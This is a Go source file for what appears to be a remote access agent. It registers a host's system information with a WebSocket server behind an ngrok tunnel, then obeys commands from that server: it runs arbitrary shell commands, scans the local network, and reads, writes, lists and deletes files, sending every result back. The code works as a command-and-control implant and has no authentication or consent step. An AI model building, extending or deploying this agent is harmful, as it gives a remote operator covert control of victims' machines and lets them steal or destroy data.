package main

import (
	"encoding/json"
	"fmt"
	"log"
	"remote-access/pkg/connection"
	"remote-access/pkg/executor"
	"remote-access/pkg/fileops"
	"remote-access/pkg/netscanner"
	"remote-access/pkg/sysinfo"
	"strings"
	"time"
)

func main() {
	fmt.Println("=== Remote Access Agent Starting ===\n")

	// Get system info
	sysInfo, err := sysinfo.GetSystemInfo()
	if err != nil {
		log.Fatal("Failed to get system info:", err)
	}

	// Create WebSocket client
	client := connection.NewClient("wss://42409defeb6f.ngrok-free.app")

	// Set up message handler for incoming commands
	client.SetMessageHandler(func(messageType string, data map[string]interface{}) {
		log.Printf("Received event: %s", messageType)

		switch messageType {
		case "execute_command":
			if cmd, ok := data["command"].(string); ok {
				log.Printf("Executing command: %s", cmd)
				
				// Handle special commands FIRST before regular execution
				switch {
				case cmd == "NETWORK_SCAN":
					log.Println("Performing network scan...")
					
					// Send immediate acknowledgment
					client.Emit("scan_started", map[string]interface{}{
						"message": "Network scan started...",
					})
					
					// Run scan in goroutine to allow heartbeat
					scanDone := make(chan bool)
					var scanResult *netscanner.NetworkScanResult
					var scanErr error
					
					go func() {
						scanResult, scanErr = netscanner.ScanNetwork()
						scanDone <- true
					}()
					
					// Wait for scan to complete
					<-scanDone
					
					if scanErr != nil {
						log.Printf("Network scan error: %v", scanErr)
						client.Emit("command_result", map[string]interface{}{
							"output": "",
							"error":  scanErr.Error(),
						})
						return
					}
					
					jsonResult, err := json.Marshal(scanResult)
					if err != nil {
						log.Printf("JSON marshal error: %v", err)
						client.Emit("command_result", map[string]interface{}{
							"output": "",
							"error":  "Failed to marshal scan result",
						})
						return
					}
					
					log.Printf("Network scan complete. Found %d devices", scanResult.TotalDevices)
					client.Emit("command_result", map[string]interface{}{
						"output": string(jsonResult),
						"error":  "",
					})
					return

				case strings.HasPrefix(cmd, "FILE_LIST:"):
					// File operations
					path := strings.TrimPrefix(cmd, "FILE_LIST:")
					result := fileops.ListFiles(path)
					jsonResult, _ := json.Marshal(result)
					
					client.Emit("command_result", map[string]interface{}{
						"output": string(jsonResult),
						"error":  "",
					})
					return

				case strings.HasPrefix(cmd, "FILE_READ:"):
					path := strings.TrimPrefix(cmd, "FILE_READ:")
					result := fileops.ReadFile(path)
					jsonResult, _ := json.Marshal(result)
					
					client.Emit("command_result", map[string]interface{}{
						"output": string(jsonResult),
						"error":  "",
					})
					return

				case strings.HasPrefix(cmd, "FILE_WRITE:"):
					parts := strings.SplitN(strings.TrimPrefix(cmd, "FILE_WRITE:"), "|", 2)
					if len(parts) == 2 {
						result := fileops.WriteFile(parts[0], parts[1])
						jsonResult, _ := json.Marshal(result)
						
						client.Emit("command_result", map[string]interface{}{
							"output": string(jsonResult),
							"error":  "",
						})
					}
					return

				case strings.HasPrefix(cmd, "FILE_DELETE:"):
					path := strings.TrimPrefix(cmd, "FILE_DELETE:")
					result := fileops.DeleteFile(path)
					jsonResult, _ := json.Marshal(result)
					
					client.Emit("command_result", map[string]interface{}{
						"output": string(jsonResult),
						"error":  "",
					})
					return

				default:
					// Regular command execution (only for normal shell commands)
					log.Printf("Executing shell command: %s", cmd)
					result := executor.ExecuteCommand(cmd)
					
					client.Emit("command_result", map[string]interface{}{
						"output": result.Output,
						"error":  result.Error,
					})
					return
				}
			}

		case "registered":
			log.Printf("Registration confirmed: %v", data)
		}
	})

	// Connect to server
	err = client.Connect()
	if err != nil {
		log.Fatal("Failed to connect:", err)
	}
	defer client.Close()

	// Wait a moment for connection to establish
	time.Sleep(1 * time.Second)

	// Register with server by sending system info
	log.Println("Registering with server...")
	err = client.Emit("register", sysInfo)
	if err != nil {
		log.Fatal("Failed to register:", err)
	}

	// Keep connection alive
	log.Println("Agent running and waiting for commands...")
	client.KeepAlive()
} 